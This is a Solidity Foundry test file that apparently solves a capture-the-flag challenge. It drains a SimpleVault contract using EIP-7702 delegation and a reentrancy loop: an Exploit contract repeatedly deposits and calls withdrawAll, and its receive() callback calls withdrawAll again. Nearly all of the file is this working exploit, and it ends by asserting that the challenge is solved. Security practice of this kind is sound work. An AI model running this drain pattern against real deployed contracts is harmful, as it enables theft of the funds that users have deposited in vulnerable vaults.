// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import {Test, console} from "forge-std/Test.sol";
import {Setup} from "./Setup.sol";
import {SimpleVault} from "./SimpleVault.sol";

contract ExploitTest is Test {
    Setup setup;
    SimpleVault simpleVault;
    address attackerAddr;
    uint256 attackerPrivateKey;

    function setUp() public {
        (attackerAddr, attackerPrivateKey) = makeAddrAndKey("attacker");
        setup = new Setup{value: 10000 ether}();
        simpleVault = setup.simpleVault();
        vm.deal(attackerAddr, 1 ether);
    }

    function test_Exploit() public {
        console.log("before the attack:");
        emit log_named_decimal_uint("  attacker balance", attackerAddr.balance, 18);
        emit log_named_decimal_uint("  vault balance", address(simpleVault).balance, 18);

        vm.startPrank(attackerAddr, attackerAddr);

        ////////// ATTACK //////////

        Exploit exploit = new Exploit();
        vm.signAndAttachDelegation(address(exploit), attackerPrivateKey);
        Exploit(payable(attackerAddr)).exploit{value: 1 ether}(address(simpleVault));

        ////////// ATTACK END //////////

        vm.stopPrank();

        console.log("after the attack:");
        emit log_named_decimal_uint("  attacker balance", attackerAddr.balance, 18);
        emit log_named_decimal_uint("  vault balance", address(simpleVault).balance, 18);

        assertTrue(setup.isSolved(), "challenge not solved");
    }
}

contract Exploit {
    SimpleVault simpleVault;
    uint256 step = 0;

    function exploit(address simpleVaultAddr) external payable {
        simpleVault = SimpleVault(simpleVaultAddr);
        for (uint256 i = 0; i < 20; i++) {
            uint256 value = address(simpleVault).balance < address(this).balance
                ? address(simpleVault).balance
                : address(this).balance;
            if (value == 0) {
                break;
            }
            simpleVault.deposit{value: value}();
            simpleVault.withdrawAll();
        }
    }

    receive() external payable {
        if (step == 0) {
            step = 1;
            simpleVault.withdrawAll();
        } else {
            step = 0;
        }
    }
}
